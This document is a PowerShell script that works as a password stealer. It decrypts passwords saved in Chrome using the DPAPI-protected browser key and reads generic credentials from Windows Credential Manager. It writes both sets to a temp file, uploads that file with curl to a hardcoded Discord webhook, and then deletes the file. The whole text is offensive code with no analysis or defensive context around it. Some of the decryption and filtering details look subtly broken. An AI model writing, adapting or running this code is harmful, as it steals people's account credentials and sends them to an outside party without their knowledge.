# Function to decrypt Chrome passwords
function Get-ChromePasswords {
    $localStatePath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Local State"
    $localState = Get-Content -Path $localStatePath -Raw | ConvertFrom-Json
    $key = [System.Convert]::FromBase64String($localState.os_crypt.encrypted_key) | Select-Object -Skip 5
    $key = [System.Security.Cryptography.ProtectedData]::Unprotect($key, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
    
    $dbPath = "$env:USERPROFILE\AppData\Local\Google\Chrome\User Data\Default\Login Data"
    $dbConnection = New-Object -TypeName System.Data.SQLite.SQLiteConnection -ArgumentList ("Data Source=$dbPath;Version=3;")
    $dbConnection.Open()
    $cmd = $dbConnection.CreateCommand()
    $cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"
    $reader = $cmd.ExecuteReader()

    $passwords = @()
    while ($reader.Read()) {
        $url = $reader["origin_url"]
        $username = $reader["username_value"]
        $encryptedPassword = $reader["password_value"]
        $iv = $encryptedPassword[3..14]
        $payload = $encryptedPassword[15..($encryptedPassword.Length - 1)]
        $cipher = [System.Security.Cryptography.AesGcm]::new($key)
        $password = [System.Text.Encoding]::UTF8.GetString($cipher.Decrypt([byte[]]$iv, [byte[]]$payload, $null, $null))
        $passwords += [pscustomobject]@{URL = $url; Username = $username; Password = $password}
    }
    $dbConnection.Close()
    return $passwords
}

# Function to get Credential Manager passwords
function Get-CredentialManagerPasswords {
    $credentials = Get-StoredCredential -Type Generic | Where-Object { $_.TargetName -like "LegacyGeneric:target=" }
    $result = @()
    foreach ($credential in $credentials) {
        $result += [pscustomobject]@{
            Target = $credential.TargetName
            Username = $credential.UserName
            Password = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($credential.Password))
        }
    }
    return $result
}

# Combine results and save to file
$chromePasswords = Get-ChromePasswords
$credentialManagerPasswords = Get-CredentialManagerPasswords

$outputPath = "$env:TEMP\credentials.txt"
$chromePasswords | Out-File -FilePath $outputPath -Append
$credentialManagerPasswords | Out-File -FilePath $outputPath -Append

# Upload to Discord
$webhookUrl = "https://discordapp.com/api/webhooks/1163648209806180373/1a4UKrWxReg-ICzIMM-Q3Pt14l02wOnM3MUdb4LU6RHs_DlGiFjzq_K0jpFB_yFUDP2R"
$curlCmd = "curl.exe -F `file1=@$outputPath` $webhookUrl"
Invoke-Expression -Command $curlCmd

Remove-Item -Path $outputPath
